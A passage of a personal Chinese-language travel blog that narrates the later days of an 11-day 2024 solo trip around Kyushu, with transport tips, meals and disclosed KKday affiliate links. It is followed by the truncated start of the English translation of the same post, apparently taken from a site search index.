，一出站發現一堆人在排隊就放棄了，右轉去門司港公車站等公車去下關口。下關在下關口地下人行道的地方下車，這次從另一個角度看 關門橋 ， 圖右是 去年從 門司港懷舊展望室 眺望 的景色。這邊有一個和布刈神社鳥居，後面山上有 和布刈神社、和布刈神社展望台。從人行道入口搭電梯到 B1 就是徒步區了，人員免費、腳踏車要收 20 日圓過路費，另外這邊有山豬出沒，要注意ＸＤ全長 780 公尺，一路直直到底，走到中間會有一條分界線。到下關口後出來有商店賣簡單的點心，買了一個章魚餅果腹。(裡面 QQ 的、皮脆、真的有章魚，好吃！)從對面的角度看關門橋、門司港懷舊展望室，有台灣八里看淡水那感覺了。一路徒步海岸到唐戶市場。快到唐戶市場的路上會經過赤間神宮，順路前去參拜。唐戶市場外的海岸邊有很多人會買完在外面野餐坐著吃，人雖多但還是很乾淨；因為我主要是踩點跟不太吃生食就沒進去裡面看了，中午時分來裡面看起來很多人。過唐戶市場就是碼頭可以坐渡船直接回門司港，到對面商店自動購票機買票即可；有時間還可以去巖流島(來！決鬥的聖地！)逛逛。大約 10 分鐘就能抵達門司港。(真的有淡水八里渡船的感覺了！)回到門司港開始飄雨， 門司港去年已經來過 ，就不多停留，準備去車站拿行李往小倉、博多出發了。時間約莫 14:00 了，抓了一下時間去到唐津城大約會在 4:30 左右，分秒必爭，於是在小倉發動新台幣(日幣)的力量，直接買 山陽新幹線 小倉 — 博多 段 世界最速300km/h 狂飆， 只需要 15 分鐘就能抵達 (JR 特急要 45 分鐘、區間要 65 分鐘) 。 JR Pass 九州並不包含 搭乘 山陽新幹線(小倉博多段)，希望(Nozomi)號、瑞穗(Mizuho)號，要另外在新幹線站台買票，刷 JR Pass 會被拒絕入站，如果碰巧入站出站也會被拒，會需要補票 ( 上次的經驗就是 )。⚠️從 JR 唐津要走約 20 分鐘才能到唐津城，搭高速巴士會在唐津城前橋下車，因此決定跑去搭高速巴士。(也是第一次搭！)到博多後直接搭地鐵到天神南並在地下街完成行李寄放。(運氣好剛好在 2 號找到最後一個行李箱的位置)從天神地下街西 8 的出口，Fukuoka Mitsukoshi 三越百貨跟著指示往天神高速巴士總站 3 樓，就能抵達巴士站。因不確定是否要劃位跟買票，所以直接去櫃台買票 ；買完票，肚子很餓，在星巴克隨便買個麵包就去指定月台排隊候車。(實際發現往唐津不用劃位、可以用交通卡，就跟搭公車一樣；不管哪站下車，車資固定 1,100 日圓)15:02 搭上網唐津(寶當棧橋)的高速巴士，滿座率約 80%。右圖為 去年從福岡塔鳥瞰這條路 ，今年是從這條路看福崗塔。(一種時空交錯感)主要是日本通勤族，過了唐津市區後車上就只剩我一人了，我要坐到最底站 — 寶當棧橋。唐津 KKday 包車行程參考：「【福岡包車一日遊】日本九州福岡縣｜福岡塔、太宰府天滿宮、大濠公園、唐津、櫻井二見浦、呼子朝市、糸島、天神地下街｜行程自由搭配！」下車後往前走一點就是保當棧橋，一路往後走就是唐津城；看到這個前橋後城的景色，這一路奔波都值得了。大約 16:35 抵達這邊，距離唐津城關門只剩 25 分鐘，想說來都來了就去走走。唐津城需要從下面走一段山坡才會到，時間緊迫，直接左轉去旁邊舞鶴公園搭電梯上去。搭乘電梯單趟 100 日圓，從門口販賣機買票交給服務人員即可。天守閣已關閉參觀，上來看看風景跟唐津城而已。在電梯關門前回到入口，順路照著觀光地圖徒步回 JR 唐津站。走石垣道先去唐津神社。(路上人煙稀少、荒涼)唐津神社(超過 17:00 已休息)、舊唐津銀行( 與東京車站同位建築設計師 — 辰野金吾 )。車站附近就是 曳山展示場 (超過 17:00 也休息了)，只能在車站看看小型的模型。 到唐津站就搭 JR 回博多(天神南)了；出站遇到問題，因為是 JR 唐津站入站，地鐵天神南出站，站務員不認 JR Pass 要求補整段(JR 唐津到天神南)的票 QQ。博多正下著大雨(雨神發威)，在天神地下街隨便買個天神地下街飯糰當晚餐就拖著行李前往飯店了。 這家 APA 空間比較大，不過整體設備都很古老，也是我第一次住到不是一體式衛浴的 APA、並且無泡湯浴場、智慧整合 (查看洗衣機、Airplay…)。點心是草莓冰沙、宵夜是超商炸雞、秋雅(好甜)。結束漫長的一天。Day 7 佐世保 (九十九島)、武雄溫泉早上陰天，也來到 JR Pass 的最後一天，沒辦法更改行程，只能繼續搭上前往佐世保的列車。JR 車程大約一個半小時，錄了一下段 JR 九州車內廣播作為回憶。最後一段 早岐 到 佐世保 會倒著開(約 10 分鐘)，如果怕暈車可用腳擋切換椅子的面向。出佐世保站之後過馬路到對面再往後面走找到 6 號站牌，往「九十九島水族館」。轉搭公車到九十九島水族館站下車後約走 5 分鐘就能到九十九島遊覽船遊客中心，就能買票搭船了。(出示 JR Pass 有折扣) KKday 線上購票： 日本九州長崎|九十九島遊覧船 船票九十九島遊覽船九十九島官網資訊這次搭乘的是 11:00 左邊這艘白色的珍珠皇后號。大雨，天候不佳，當不成航海王，只能撐著傘吹著風淋著雨。”) 船上有中英日韓介紹廣播、航程約 50 分鐘、有廁所、販賣部。 船艙外可以上到甲板、鳥望台，但當天雨大風大就沒上去了。 船穿過兩座島嶼中間時風會特別大，要小心。船艙內有座位。結束大雨中沒看到什麼東西的遊覽後就一路返回佐世保了。回程路上順路去 蜂之家 品嚐佐世保名產檸檬牛排。檸檬牛排就是四片牛排薄片＋醬汁＋檸檬片＋檸檬汁，口感清爽、肉量稍微不足。吃完又再點了另一個名物水果泡芙，裡面餡料豐滿，有真的水果切塊在裡面。吃完去商店街晃了一下就搭公車回車站了。搭往回(博多、武雄溫泉)方向的列車，這邊是底站所以要等清潔人員清潔完畢才能上車；跟來的時候一樣 早岐 到 佐世保 會倒著開。此時時間約 13:30。 佐世保還能去豪斯登堡，但我沒有特別安排要去。 KKday 佐世保參考行程： 日本長崎|九州豪斯登堡門票 Huis Ten Bosch 日本長崎|佐世保 SASEBO 軍港遊艇之旅 【佐世保 】岸上觀光|名勝世界壹號 Resorts World One 九十九島水族館海吉良入場券+珍珠串珠體驗(附珍珠) (長崎縣佐世保市)武雄溫泉 KKday 行程參考：「九州佐賀一日遊｜祐徳稲荷神社・嬉野溫泉・御船山樂園・武雄圖書館＆武雄神社／鳥栖精品暢貨中心（TOSU PREMIUM OUTLETS）｜福岡博多出發」上次去長崎經武雄溫泉換車，對這站沒什麼印象，後來有追蹤 武雄市的觀光 IG （官方會定期舉辦活動，例如免費螢火蟲接駁，有要去武雄泡溫泉住宿的可以關注。）這次想說剛好路過＋有時間就去看看。從武雄車站(無人車站，JR Pass 不需投入、直接出站)，出來街道上也人煙稀少、很安靜。只是路過走馬看花，就只去查到的主要景點，剛好是對角，公車班次不多、不想等，所以直接用走的。先去武雄神社，路上會經過塚崎大楠樹，一個小景點。塚崎大楠樹，樹齡推估 2,000 年。武雄神社從下要走一小段樓梯往上到武雄神社。武雄神社旁邊穿過御神木鳥居再往後走約 5 分鐘就能看到傳說中的武雄大楠樹。(樹齡推估 3,000 年)武雄大楠樹有圍起來，只能遠觀。買了一個武雄神社大楠守(1,500 日圓)，尺寸較大＋木盒。武雄神社參拜完就往回走去看另一邊蓬萊湯門樓。 整條溫泉街都沒人，有好幾家溫泉、住宿飯店可以選擇(不一定要蓬萊湯)，感覺如果有要來九州泡湯想要人少寧靜＋交通方便，武雄溫泉是個很好的選擇！蓬萊湯門樓到此一遊。進門樓之後就是蓬萊湯泡湯的，另一邊還有溫泉住宿鷺乃湯。武雄市觀光地圖，查資料有查到御船山樂園看起來不錯，但此時已差不多 15:30，來不及去了。搭乘往博多的特急，約 18:00 回到博多。漫步回飯店，晚餐超商隨意解決，御飯糰、豬排三明治、 不二家桃子氣泡飲(好喝！！) ；住了那麼多次 APA、東橫 Inn 才發現都有製冰機，太爽啦！扣除掉設備舊，這家 APA 的房間大小、景觀真的不錯。Day 8 櫻井二見浦 夫婦岩、南藏院、博多巡禮已無 JR Pass。 KKday 包車行程參考：「【福岡包車一日遊】日本九州福岡縣｜福岡塔、太宰府天滿宮、大濠公園、唐津、櫻井二見浦、呼子朝市、糸島、天神地下街｜行程自由搭配！」櫻井二見浦 夫婦岩一早換完飯店後搭乘 JR 到九大學研都市站。出站左手邊就是「 西之浦線 」月台也有工作人員指引，搭乘時間約 30 分鐘。車資是我搭過最高的公車車資，730 日圓。下車後就是 櫻井二見浦 夫婦岩。近看很美、很寧靜。 這邊結束之後可以再往後去櫻井神社(據說因為跟日本團體嵐成員名字一樣，會有很多歌迷去朝聖)或再往後去 芥屋大門觀光船 (看起來很酷！) 。回程時刻表，直達博多的下午每小時一班、回 九大學研都市站 每小時一班。回到博多大約中午 12:30，先來去覓食。再訪 ハカタミヤチク (日本一宮崎牛専門店 博多みやちく) 品嚐宮崎牛商業午餐。商業午餐 CP 值超高(晚上是高級燒肉套餐料理)＋社恐人天堂獨立包廂。這次點瘦肉套餐 200g 3,200 日圓，狂嗑了兩碗白飯(飯湯免費續)。南藏院回博多後搭火車前往南藏院前站。出站一路走出來，經過荒神茶屋(可以在此休憩、吃午餐)，過馬路就會到南藏院入口。 走右邊參觀臥佛，左邊也有求姻緣、平安、不動明王雕像。 南藏院是私人院所並因也有供奉塔位，所以規定跟禁止拍照的地方比較多，需要遵守。禁止短袖短褲露肚露肩、播音樂、跳舞、攝影(如：入口山洞整排牌位、不動明王像)來打平台後就能看到臥佛本尊，腳底有經文，整體很壯觀莊重。參觀完畢後就搭火車又回到博多站了，約 15:40 抵達博多站。博多巡禮補一些 上次九州沒去到的地點 。祇園 — 東長寺東長寺二樓有福岡大佛可以參拜(50 日圓)。參拜完離晚餐 17:00 鐵鍋煎餃 鉄なべ 營業還有一個小時，再去大濠公園逛逛。大濠公園大濠公園很大，走一圈大概要 45 分鐘；可以踩天鵝船。福岡市美術館週一沒有營業，只能遠觀草間彌生南瓜。走完逛完時間差不多 17:00，可以去吃晚餐了！鐵鍋煎餃 鉄なべ上次來吃過一次 鐵鍋煎餃 鉄なべ 還懷念那脆脆煎餃味道。 他有另一家 分店 — 鐵鍋煎餃 鉄なべ 博多 祇園店 ，前幾天路過大門深鎖，貼了一張公告說整修中，請前往本店。(但是 Google Map 仍然顯示有營業) 醬料、水自助。 店家不支援電子支付，只收現金。 ⚠️大約 17:20 看大家在外面等，沒多久，店員阿嬤就出來招呼可以進去了。這次 知道要點兩份煎餃了，上次阿嬤比手畫腳說 1 份吃不飽(那時候不懂)，1 份 8 顆 (500 日圓)、兩份 16 顆，再點一杯生啤結束這回合！煎餃都是現點現煎，上來還會滋滋滋，皮薄很脆，內餡應該是韭菜豬肉，單純不鹹又很有食材本身的味道。吃完 18:00 出來就開始有一些人在排隊等候了。吃飽走回飯店，路過正在準備的中洲屋台，這次來發現多好多共享單車。 這次一直換飯店，好累；這是最後三天的飯店。點心冰淇淋、宵夜是超商熱狗。Day 9 KKDAY 高千穗一日遊，高千穗神社、高千穗峽谷、天岩戸神社、天安河原直接跟「【一人成團，每日出團】日本九州一日遊｜高千穗峽＆天岩戸神社＆天安河原（含特色阿蘇赤牛烤肉套餐）｜福岡出發」行程。 其他地點出發(熊本)或搭配其他景點(阿蘇、南阿蘇、白川水源)，可參考 KKday 其他行程。早上 07:45 前往 博多車站築紫口 (博多後站)在 LAWSON（羅森）博多站筑紫口店 前廣場找到要去的目的地的一日遊行程導遊。(同時間會有好幾團，有 KKDAY 自己帶隊的、EasyGo的、要去高千穗的、由布院的…等等)導遊(中文)手上有名單，完成報到後會跟你說車號，記好車號就能直接上車了。 位子先到先坐，如果有特殊情況(易暈車)可以跟導遊說。08:00 人到齊發車 導遊自我介紹(石楠)、中英日文 行程介紹，導遊說高千穗一日遊是全部一日遊方案裡最遠的最辛苦的ＸＤ 車上有 WiFi (不過不太穩) 隨時係好安全帶 ⚠️ 大部分是台灣人 介紹高千穗神社、調查有無人有預約划船 到第一個高千穗神社約需 3 小時關於高千穗划船 高千穗划船需要提前三天預約，每個時段名額有限 ⚠️ 高千穗划船需要提前三天預約，每個時段名額有限 ⚠️ 高千穗划船需要提前三天預約，每個時段名額有限 ⚠️划船路程不長，來回應該 30–45 分鐘就結束，約 12:00 會吃完午餐、高千穗行程約 13:20 結束，要重新集合返回。我們這團有 3 組人有預約。 因此若要搭配一日遊預約划船，12:00 / 12:30 會是比較適合的時間點。 ⚠️吃完午餐會需要徒步前往高千穗峽谷，如果有預約划船或是自己覺得體力無法負荷的，導遊有安排接駁車直達，節省時間。 實際還是以 KKDAY 安排為主，建議預約前先詢問官方，確保沒有問題。 ⚠️9:20 休息站休息因車程較長，途中會在休息站休息 10 分鐘讓大家上廁所動動筋骨。10:50 抵達高千穗神社高千穗神社整個被神木包圍著，整體透露著寧靜、清新。夫婦杉 ，導遊在車上的時候有說，如果是跟家人、夫妻、情侶、朋友來可以手牽手繞樹三圈，祈福。約 11:20 回到集合回車上。11:30 午餐 高千穗料理 神樂宿參拜完高千穗神社先去附近吃午餐。需拖鞋，整體很像是專門接待團體觀光客的日式餐廳，但我也是第一次體驗日式餐廳。餐點整體普通偏下，可能是因為團體人多，大部分都冷掉、肉質吃起來也普普。12:15 開始徒步到高千穗峽谷 (一路下山)吃飽飯後一路往下跟著導遊徒步到高千穗峽谷。大約走 20 分鐘的步道就能看到高千穗峽谷，從這個角度可以看到峽谷尾部(划船終止線)。12:45 抵達高千穗峽谷從高千穗峽這邊的橋看回去剛剛走來的古道跟下方的船。划船場，過橋下去就是了，總長(到剛剛看到的停止線)我覺得差不多 250 公尺。有個小公園、商店街，可以吃吃冰或點心補充體力。13:20 重新集合回遊覽車約 13:45 抵達天岩戶神社西本宮 (看資訊櫻花季會有其他行程)下遊覽車後走約 5 分鐘到 天岩戶神社西本宮，商店街商家門口會懸掛不同的神面具。導遊會補充在遊覽車上有介紹的天照大神的故事。去天安河原也要走一小段，導遊跟大家約定一起先走到天安河原後大家再自行返回，可以盡情參觀 (或直接跟著導遊返回)。約 14:00 徒步前往天安河原約 14:15 抵達天安河原天安河原山洞，就是天照大神曾經躲起來的地方；神社鳥居周圍堆滿了參拜者留下來的石頭。參拜完回到來的路上有經過的冰店。大家都在這排隊滿冰淇淋，也一起嘗試了宮崎本地芒果冰淇淋(900 日圓)，導遊說宮崎芒果很高級，不過老實說還是台灣的芒果比較有芒果味。休息完慢慢走回參拜天岩戶神社。約 15:10 集合回程去完最後一個行程之後已下午三點多，要開始回程了(依然是三小時車程回福岡)。約 16:40 停靠休息站回程同樣會在中途停靠休息站讓大家上廁所活動活動。約 18:00 多回到 博多車站築紫口 (博多後站)行程順利結束，謝謝石楠的帶領與行程安排👏👏👏👏👏。晚餐隨便買了超商熱狗、前幾天 Day 6 有吃過的天神地下街飯糰，新的葡萄口味 Suntory 好喝！！點心再嗑了一個 BRULEE。晚安。Day 10 博多逛街、天神逛街、PayPay Dome 看棒球九州景點行程差不多告一段落了，剩下接近兩天的逛街購物行程。早上先去唐吉訶德(24 hr) 簡單採買， 天神本店 很大間，有好幾層可以逛。接近中午去博多站百貨公司晃晃、買伴手禮、福岡產的清酒、福砂屋長崎蛋糕、小倉名月米果…等等下午回到天神周邊、天神地下街、Le Labo、岩田屋百貨、三井百貨…等等(天神這邊一堆百貨公司)。Le labo Another 13 剛好噴完補貨，這次買 50ml (退完稅約 $5,800 台幣)。在天神 C-pla 扭了一個有趣的公車下車按鈕ＸＤ[]”)](https://www.youtube.com/watch?v=JwwjYSU20-c){:target=”_blank”}按了會有聲音ＸＤ。提著戰利品回飯店休息，吃個熱狗跟甜品還有 日本必喝！生可樂！博多運河城休息一下之後重新出門，16:30 抵達博多運河城。主要是去他 B1 的超大扭蛋百貨。https://gofukuoka.jp/zh-tw/spots/detail/196050逛完前往博多站。大約 17:30 到博多站搭公車去 PayPay Dome，晚上 18:00 看棒球比賽。Fukuoka SoftBank Hawks 福岡軟銀鷹 比賽 @ 福岡 PayPay Dome 球場 今天的對戰組合是：Fukuoka SoftBank Hawks 福岡軟銀鷹 v.s. Tokyo Yakult Swallows 東京養樂多燕子一些入場規定提醒 ： 需要打開背包過安檢、不能自己帶吃的，可以帶一瓶茶水飲料、不能自己帶酒、裡面有賣酒水食物、出去再入場記得領再入場許可券福岡軟體銀鷹隊的吉祥物就叫 Harry，當然要來看球支持一下。上次坐在比較貴的內野本壘區 ，這次想說坐最便宜的來體驗氛圍就好，本來以為有自由席，結果是全部指定席，就挑了一個外野側最後一排靠邊邊方便進出的位置了(外野這邊的椅子沒椅背，好處是比較好跨越進出)。不的不佩服日本的職業運動風氣，平日、晚上 18:00 球場座位約 40,000 個，幾乎滿場，再選位子的時候都沒有整排空的或靠邊邊角落的位子。視野、距離跟上次比就差很多了。這次大比分落後，終場以 9:3 戰敗結束，沒有煙火可以看，但也見識到兩隊的應援活動。(福岡軟體銀鷹隊的氣球應援跟東京養樂多燕子隊的雨傘舞應援)大約 7 局打完就已經 9:1，大家就開始陸續離場了，我也沒看到最後。公車站一樣排滿人，跟上次一樣跟著人群走路回到地鐵唐人町站。(約 15 分鐘)回飯店休息前，刻意在走道中洲屋台看離開福岡前的最後一眼夜景。宵夜，日清咚兵衛豆皮泡麵(這次來那麼多天才第一次吃)、大分產的水果酒、超商雞油炸雞(Juicy 好吃)。Day 11 Lalaport、博多逛街、天神逛街、回程不知不覺出國 11 天了，已開始想念台灣的美食，晚上 21:00 的飛機還有很多時間可以亂逛。https://toyscabin.com/product/20221201_546.php主要的伴手禮都買好、裝好行李了，今天就純粹亂逛找電車發車這個扭蛋。(最終沒找到，參考 廠商提供的店家 ，市區的都售罄了)Lalaport早上沒事先去逛 Lalaport。(10 點營業)一樓超市有一台西鐵公車改裝的飲料櫃，很酷ＸＤ。主要是來三樓 ガチャガチャの森 跟一樓手扶梯下的 Pon! 看有沒有我要找的扭蛋。(沒有)時間接近 11 點，沒吃早餐很餓，就在三樓美食街吃海鮮天婦羅蓋飯解決(覺得很鹹)。再回到一樓買如水庵的草莓大福解膩。找不到要找的扭蛋就離開 Lalaport 回博多站，1010 裡面也有 Pon! 同樣沒有。去 博多 Yodobashi 的扭蛋區域找也沒找到。博多失利之後回到天神地區的扭蛋店尋找，同樣沒有收穫。最後放棄，去逛逛樓上的 Animate、Kiddy Land（有超多 IP 的周邊）時間大約來到下午 16:00，快要結束這次旅行了，最後坐在客美多咖啡吃個甜點跟咖啡休息。約 17:00 回飯店拿行李，慢慢往福岡機場移動，本來以為下午五點多地鐵人會很多，其實也沒什麼人。從天神南走到天神蠻遠的，拖著行李大概需要 15 分鐘。搭乘機場線到福岡機場站(國內線)之後還要轉機場接駁車(免費)到國際航站樓。接駁車班次蠻密集的，大約 5–10 分鐘一班，路程大約 10 分鐘，下車還要再走到 3F 出境大廳；保守抓的話機場線地鐵出來還要 +30 分鐘才會真的到國際線機場大廳。福岡機場正在整修，比較混亂。到機場的時間還太早，櫃檯還沒開放，地勤人員指引我們先去 1 自助報到再去 2 自助托運行李，他們會從旁協助；很快就完成行李託運了(這次才 17 Kg)。大約 18:30 就開始候機了。福岡機場出境的候機廳是狹長型的，人很多很多，非常混亂擁擠。(不知道是不是因為還在整修跟太多航班等待起飛的關係)。精品、化妝品免稅店蠻完整的，店員也都會中文；伴手禮店也有(這裡就有福砂屋長崎蛋糕)；菸酒類免稅店只有一家要排隊、吃的跟超商更不用說了，直接排爆。 前一班 CI129 19:10 的特別公告請大家遵守華航只能攜帶一件隨身行李的規定，超過要加購(這班看起來滿座)。⚠️後面覺得這邊太吵混亂，就往 501–504 北邊走，這邊沒什麼人；也有家咖啡廳簡餐店可以吃東西。簡單買個豬排三明治跟去投幾罐生可樂、桃子水帶回台灣。約 20:30 開始登機，這班沒有特別檢查手提行李一件的規定(但我早就全塞成一件了…)，21:00 準備起飛，21:09 起飛，飛機是 A330–300 設備比較舊。再見九州、再見日本，飛機餐是薑味豬肉炒麵，不怎麼樣，但水果有哈密瓜！一路遇到亂流很顛波，搖搖晃晃順利降落台灣，時間延誤了快 30 分鐘，接近 23 點才到。(表定 22:25)因為怕趕不上公共交通一路狂奔，機捷沒趕上但還好最後趕上客運，不然又要坐不太安全的白牌計程車回台北了。1819 路線 ，我的神，到北車車程約 55 分鐘。 中途停靠站如上圖，若是要在中途下車的要跟司機大哥提前在上行李的時候說，他會分開放，不然北車下車的會統一放一起，如果要中途下會無法拿行李。⚠️6/14 00 點多，回到溫馨的家，結束這趟 11 天的旅程。每日步行平均都在 2 萬步上下，最高走到 27,000 步。戰利品右邊那盒漏拍了，是在博多站百貨公司商品街試吃到覺得好吃的蝦餅。日本各地搜集來的小物這次新增七大福中的四尊、迷你啤酒、高千穗(狗)戌年御守。背景報紙是買 Le Labo 送的。最後，感謝您閱讀我的旅遊記錄；也感謝這次同行的夥伴 James。下次旅遊的靈感 東南亞 南九州鹿兒島降落 -&gt; 大分 -&gt; 向日葵號郵輪 -&gt; 神戶 -&gt; 姬路城 -&gt; 天橋立 -&gt; 名古屋機場回來 東北地區、仙台KKday 推廣 日本 JR PASS｜九州地區鐵路周遊券｜北九州＆南九州＆全九州｜電子票 日本長崎|九州豪斯登堡門票 Huis Ten Bosch 日本福岡|博多港ー釜山港・客貨郵輪「新山茶花號」Camellia Line 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案 福岡西鐵｜太宰府 天滿宮+柳川遊船 觀光暢遊套票｜福岡機場國際線領取 日本福岡teamLab Forest 福岡門票 — SBI 證券｜立即確認 【一人成團】日本九州一日遊｜高千穗峽＆天岩戸神社＆天安河原（含特色阿蘇赤牛烤肉套餐）｜福岡出發 九州熊本一日遊｜阿蘇中岳火山・草千里・熊本城・水前寺成趣園／季節水果吃到飽｜福岡博多出發（中英日對應） 如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝。更多遊記 [遊記] 2025 韓國釜山 8 天 7 夜自由行 [遊記] 2024 山陰廣域地區 島根 出雲 松江 鳥取 姬路 大阪 神戶 7 日獨旅自由行 [遊記] 2023 九州 10 日自由行獨旅 ⭐️ (九州上篇) [遊記] 2023 廣島岡山 6 日自由行 [遊記] 9/11 名古屋一日快閃 [遊記] 2023 東京 5 日自由行 [遊記] 2023 京阪神 8 日自由行有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝： Follow Me on Medium 1K+ Followers 4,453 Total Views Last Statistics Date: 2025-08-15 | 4,409 Views on Medium." }, { "title": "Travel Diary 2024: Second Visit to Kyushu - 9-Day Free Trip via Busan → Hakata Cruise Entry", "url": "/posts/travel-diaries/en/travel-diary-2024-second-visit-to-kyushu-9-day-free-trip-via-busan-hakata-cruise-entry-cb65fd5ab770/", "categories": "Travel Diaries", "tags": "Lifestyle, Japan, Travel, Fukuoka, Travel Writing", "date": "2024-06-21 01:17:26 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版[Travel Diary] 2024: Second Visit to Kyushu - 9-Day Free Trip via Busan → Hakata Cru...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版[Travel Diary] 2024: Second Visit to Kyushu - 9-Day Free Trip via Busan → Hakata Cruise EntryI took the New Camellia cruise from Busan, South Korea, to Hakata, Japan, and explored Yufuin, Oita, Fukuoka, Shimonoseki, Shimanami, and Sasebo over a total of 11 days.BackgroundTaking advantage of a brief break between jobs, I decided to visit Japan again. I left my previous job on May 30, departed on June 3, returned on June 13, and started my new job on June 24. The timing worked out perfectly, allowing me to take a longer trip (a total of 11 days). This time, I traveled solo but teamed up with James Lin (a former Binance Android Developer; feel free to reach out to him if you have job opportunities). This is my second visit to Kyushu; I visited Fukuoka, Kumamoto, and Nagasaki during my first trip in September last year. This time, I aimed to cover places I missed during my previous visit, so my itinerary differed from James’s, and we went our separate ways.Here are the places I visited last time that I may not revisit this time. If you’re interested in learning more about Kyushu, please refer to my previous travel diary, “2023 Kyushu 10-Day Solo Trip”: Fukuoka: Mojiko, Kokura Castle, Kushida Shrine, Sumiyoshi Shrine, Nakasu Yatai, Fukuoka Tower, PayPay Dome, shopping in Tenjin, Canal City Hakata, Lalaport, Yanagawa River Cruise, Dazaifu Nagasaki: Chinatown, Glover Garden, Inasa Mountain Night View, Atomic Bomb Museum, Peace Park Kumamoto: Kumamoto Castle, Aso Nakadake, Aso Shrine, Suizenji Jojuen, Tsuruya Department Store, Kamitori Shopping Street, Shimotori Shopping Street, Kato Shrine, Sakura Town Department Store, Kumamon Square (Department Head’s Office) For more details, please refer to “2023 Kyushu 10-Day Solo Trip”.Lessons Learned from This TripAs always, I’ll summarize the lessons learned from this trip at the beginning: “Traveling independently means constantly paying tuition (in time or money) to learn; the more experience you gain, the fewer pitfalls you encounter.” At small JR stations without electronic boards, check the platform bulletin board for train schedules to confirm which platform the train will arrive at. ⚠️ At some JR stations without station masters, you need to exit from the first car (the conductor also serves as the station master, similar to getting off a bus). JR limited express and regular tickets are separate; after buying a regular ticket, you need to purchase an additional limited express ticket to ride the limited express. If you board without the proper ticket, you will be asked to pay the difference. (With a JR Pass, you don’t have to worry about this; you can board without thinking.) JR limited express trains almost always have ticket checks; if you’re in a non-reserved seat, the conductor will ask where you’re going for record-keeping. If you have an online reservation for the JR Pass (which requires credit card payment for the reservation fee), you will need to show the same credit card when exchanging for the JR Pass, so make sure to bring that card to Japan. ⚠️ If you book the New Camellia too late, you may only get an economy shared room (8-11 people, mixed gender, only a Japanese-style public bath, lights out at 11 PM). If you book the Yufuin no Mori too late, there may be no seats available, and you’ll have to take the regular Yufu JR train. Reservations for boat rides in Takachiho Gorge need to be made in advance. There are two Shinkansen trains that the JR Pass does not cover: “Nozomi” and “Mizuho,” which require separate tickets. Sometimes, the ticket gates for the Shinkansen entering and exiting Hakata Station can be tricky; you may need to go through the manual gate (since you can’t take the aforementioned two trains, the station staff will let you through once they confirm you’re not boarding those trains). Always double-check your reservations; I encountered an issue with the gender on my New Camellia reservation, and I quickly contacted customer service for assistance. ⚠️(Later, I realized that it probably wouldn’t matter since it was a mixed-gender room, but it was still quite a shock.) Buses in Kyushu may not run on time, and Google Maps directions may not always be accurate. Check and reserve luggage storage options in Japan (but not all locations are listed; many places that offer storage may not appear). You need a power adapter for Korea. Korean won can only be exchanged at the counter. In Korea, you can just buy a T-money transportation card without needing a Wowpass.KKday Promotions [Japan JR PASS Kyushu Area Rail Pass North Kyushu &amp; South Kyushu &amp; All Kyushu E-Ticket](https://www.kkday.com/zh-tw/product/3494-jr-kyushu-rail-pass?cid=19365&amp;ud1=d78e0b15a08a){:target=”_blank”} [Nagasaki, Japan Huis Ten Bosch Ticket](https://www.kkday.com/zh-tw/product/3988-japan-nagasaki-huis-ten-bosch-ticket?cid=19365&amp;ud1=d78e0b15a08a){:target=”_blank”} [Fukuoka, Japan Hakata Port - Busan Port Cargo Passenger Ferry “New Camellia”](https://www.kkday.com/zh-tw/product/138770-cargo-passenger-ferry-new-camellia-fukuoka-hakata-port-busan-port?cid=19365&amp;ud1=d78e0b15a08a){:target=”_blank”} [Japan eSIM Card Daily High-Speed, Total, Unlimited Data Plans](https://www.kkday.com/zh-tw/product/137689-japan-high-speed-daily-unlimited-data-japanese-esim?cid=19365){:target=”_blank”} [Nishitetsu Fukuoka Dazaifu Tenmangu + Yanagawa River Cruise Sightseeing Pass Pick Up at Fukuoka Airport International Terminal](https://www.kkday.com/zh-tw/product/181754?cid=19365){:target=”_blank”} [Fukuoka teamLab Forest Admission Ticket — SBI Securities Instant Confirmation](https://www.kkday.com/zh-tw/product/124596-teamlab-forest-fukuoka-museum-sbi-secruities-admission-ticket-japan?cid=19365){:target=”_blank”} [One-Person Group Tour Kyushu Day Trip Takachiho Gorge &amp; Amano Iwato Shrine &amp; Amano Iwato Shrine (Includes Special Aso Red Beef BBQ Set) Departing from Fukuoka](https://www.kkday.com/zh-tw/product/32511-kyushu-chinese-guided-day-tour-from-fukuoka-takachiho-gorge-kamishikimi-kumanoimasu-shrine-amanoiwato-shrine?cid=19365){:target=”_blank”} [Kyushu Kumamoto Day Trip Aso Nakadake Volcano, Kusasenri, Kumamoto Castle, Suizenji Jojuen / Seasonal Fruits All-You-Can-Eat Departing from Fukuoka Hakata (Bilingual: Chinese and English)](https://www.kkday.com/zh-tw/product/38965?cid=19365){:target=”_blank”} PreparationsFunThis trip mainly focused on taking the New Camellia cruise from Busan, Korea, to Fukuoka (Hakata) and exploring Yufuin (Yufuin), Beppu in Oita, and Takachiho in Miyazaki Prefecture.My pre-trip plan was as follows (I finalized it the day before departure, the actual order may not follow the plan, and I later skipped South Aso because it was too far): June 3: Arrive in Busan - Gimhae Airport around 19:00, reach Busan Station by 20:00, check into the hotel, and find food nearby. June 4: Haedong Yonggungsa Temple, Haeundae, and then depart Korea in the evening, boarding the New Camellia cruise. June 5: Arrive in Fukuoka, head to Karatsu to visit Nanokama, and then go to Yutaka Inari Shrine and the large torii gate in the sea, returning via Lalaport.Actual: Only visited Yutaka Inari Shrine. June 6: Take the JR train to Yufuin in the morning, then head to Oita in the afternoon. June 7: Oita, Beppu hell tour. June 8: Mojiko, Shimonoseki, and Karato Market.Actual: Visited Karatsu Castle instead. June 9: South Aso, Shirakawa Water Source, Kamishikimi Kumanoza Shrine.Actual: Changed to Sasebo (Ninety-Nine Islands Cruise) and Takeo Onsen. June 10: Cover the itinerary missed on June 7, visit the large torii gate in the sea, Yutaka Inari Shrine, and either Lalaport or shopping.Actual: Went to Sakurai Futamigaura Meoto Iwa, Nanzoin, and a pilgrimage in Hakata. June 11: KKDAY Takachiho Day Tour, 